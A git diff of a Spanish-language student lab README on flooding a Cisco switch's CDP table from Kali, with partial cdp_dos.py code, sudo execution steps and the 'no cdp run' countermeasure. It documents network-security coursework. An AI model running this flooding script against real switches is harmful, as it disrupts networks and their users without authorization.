@@ -42,11 +42,41 @@ Generar una inundación masiva de paquetes CDP falsos con Device IDs y MACs alea
 
 ```bash
 
-ruta:
-nano /home/kali-linux/cdp_dos.pypython
+Crear y guardar el script:
+bashnano /home/kali-linux/cdp_dos.py
 
-Script
-#!/usr/bin/env python3
+Pega el contenido del script, luego guarda con Ctrl+O → Enter → Ctrl+X
+
+Dar permisos de ejecución:
+bashchmod +x /home/kali-linux/cdp_dos.py
+
+🪜 Pasos de ejecución
+Paso 1 — SW1: Ver vecinos CDP antes del ataque
+bashshow cdp neighbors
+
+Paso 2 — Kali: Ejecutar el ataque
+bashsudo python3 /home/kali-linux/cdp_dos.py eth0 500
+
+Paso 3 — SW1: Verificar tabla CDP saturada
+bashshow cdp neighbors
+
+Paso 4 — SW1: Aplicar contramedida
+conf t
+no cdp run
+end
+write memory
+
+Paso 5 — SW1: Verificar que CDP está deshabilitado
+show cdp neighbors
+
+Paso 6 — Kali: Ejecutar ataque nuevamente
+bashsudo python3 /home/kali-linux/cdp_dos.py eth0 200
+
+Paso 7 — SW1: Verificar que el ataque no tiene efecto
+show cdp neighbors
+
+🐍 Script — cdp_dos.py
+python#!/usr/bin/env python3
 # =============================================================
 # Nombre:     Henry Vicente Quezada
 # Matricula:  2025-1332
@@ -73,6 +103,7 @@ def cdp_dos(interfaz, cantidad=1000):
     print(f"[*] Interfaz     : {interfaz}")
     print(f"[*] Paquetes     : {cantidad}")
     print(f"[*] Iniciando ataque...\n")
+
     for i in range(cantidad):
         src_mac = random_mac()
         device_id = f"Device-{random.randint(1000,9999)}"
@@ -89,6 +120,7 @@ def cdp_dos(interfaz, cantidad=1000):
         if (i+1) % 100 == 0:
             print(f"[+] Paquetes enviados: {i+1}/{cantidad}")
         time.sleep(0.001)
+
     print(f"\n[✓] Ataque completado. {cantidad} paquetes enviados.")
 
 if __name__ == "__main__":
@@ -96,15 +128,22 @@ if __name__ == "__main__":
         print("\nUso:     sudo python3 cdp_dos.py <interfaz> [cantidad]")
         print("Ejemplo: sudo python3 cdp_dos.py eth0 500\n")
         sys.exit(1)
+
     interfaz = sys.argv[1]
     cantidad = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
     cdp_dos(interfaz, cantidad)
 
-ejecución: 
-sudo python3 cdp_dos.py eth0 500
+🛡️ Contramedida aplicada
 
-```
+! Deshabilitar CDP globalmente
+SW1(config)# no cdp run
 
+! O por interfaz de acceso
+SW1(config-if)# no cdp enable
+
+! Verificación
+SW1# show cdp neighbors
+% CDP is not enabled
 ---
 
 ## 4. Documentación de la Red
@@ -165,18 +204,5 @@ sudo python3 cdp_dos.py eth0 500
 
 ---
 
-## 6. Contramedidas
-
-```
-! Deshabilitar CDP globalmente
-SW1(config)# no cdp run
-
-! O por interfaz de acceso
-SW1(config-if)# no cdp enable
-
-! Verificación
-SW1# show cdp neighbors
-% CDP is not enabled
-```
 
 Al deshabilitar CDP el switch deja de procesar cualquier paquete CDP entrante, eliminando completamente la superficie de ataque. Se recomienda deshabilitar CDP en todos los puertos de acceso y mantenerlo solo en enlaces troncales de confianza entre dispositivos Cisco.
